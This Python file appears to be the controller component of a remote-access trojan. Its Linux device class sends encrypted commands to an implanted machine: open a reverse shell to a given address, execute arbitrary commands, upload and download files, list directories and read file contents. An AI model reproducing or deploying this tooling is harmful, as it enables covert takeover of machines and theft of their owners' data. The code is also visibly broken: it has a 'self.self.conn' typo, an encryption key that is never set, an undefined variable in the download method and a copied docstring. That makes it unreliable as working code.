from globals import *


class Linux():
    """The Linux Device Class to interact with the Device"""
    def __str__(self) -> str:
        return str(self.addr[0])
    def __init__(self, connection):
        self.self.conn = connection[0]
        self.addr = connection[1]

    def decrypt(self, data):
        # Decrypt the data
        return self.fernet.decrypt(data).decode()

    def encrypt(self, data):
        # Encrypt the data
        return self.fernet.encrypt(data.encode())

    def load_module(self, module):
        # Send the Module to the Device
        pass

    def execute_module(self, module):
        # Send a Request to execute a Module
        # Check if Modules is loaded
        # Get Output from the Module
        pass

    def revshell(self, address, port):
        """Open a Reverse Shell to a given Address:Port
        Args:
            address (str): Receiver Address
            port (int): Receiver Port

        Returns:
            bool: True if success, False if not
            str: Message
        """
        self.conn.send(self.encrypt(f"SHELL:{address}:{port}"))
        try:
            output = self.decrypt(self.conn.recv(1024))
        except:
            return False, ""
        else:
            if output == "0":
                return False, "Couldn't open a Reverse Shell"
            else:
                return True, output

    def file_upload(self, fil, path):
        """Upload a File to a Device
        Args:
            fil (string): File to Upload	
            path (string): Path to Upload the File to

        Returns:
            bool: True if success, False if not
            str: Error or Success Message
        """
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            self.conn.send(self.encrypt(f"file-u:{fil[-1]}|{path}"))
            time.sleep(1)
            self.conn.sendfile(f)
            status = self.decrypt(self.conn.recv(1024))
            if status == "0":
                raise Exception("File Upload Failed")
        except:
            return False, "File could not be uploaded"
        else:
            return True, "File uploaded"

    def file_download(self, device_path, own_path):
        """Upload a File to a Device
        Args:
            fil (string): File to Upload	
            device_path (string): Path to Download the File from
            own_path (string): Path to Download the File to

        Returns:
            bool: True if success, False if not
            str: Error or Success Message
        """
        try:
            f = open(fil, "rb")
            fil = fil.split("/")
            self.conn.send(self.encrypt(f"file-d:{device_path}"))
            fil = self.conn.recv(1024)
            if fil == "0":
                raise Exception
            with open(own_path, "wb") as f:
                f.write(fil)
        except:
            return False, "File not found"
        else:
            return True, "File downloaded"

    def rce(self, cmd):
        """Send a Cmd to a Device and return the Output
        Args:
            cmd (str): Command to execute

        Returns:
            bool: True if success, False if not
            str: Output of the command
        """
        self.conn.send(self.encrypt(f"CMD:{cmd}"))
        try:
            output = self.decrypt(self.conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def get_device_infos(self, id):
        """Get Infos about a Device
        Args:
        Returns:
            bool: True if success, False if not
            str: Infos about the Device
        """
        self.conn.send(self.encrypt(f"INFOS:"))
        try:
            output = self.decrypt(self.conn.recv(1024))
            output = json.loads(output)
        except Exception as e:
            print(e)
            return False, ""
        else:
            return True, output

    def get_directory_contents(self, dir):
        """Get the contents of a directory
        Args:
            dir (str): Directory to get the contents of
        Returns:
            bool: True if success, False if not
            str: Files in the directory or an Error Message
        """
        self.conn.send(self.encrypt(f"dir:{dir}"))
        try:
            output = self.decrypt(self.conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output

    def get_file_contents(self, path):
        self.conn.send(self.encrypt(f"content:{path}"))
        try:
            output = self.decrypt(self.conn.recv(1024))
        except:
            return False, ""
        else:
            return True, output
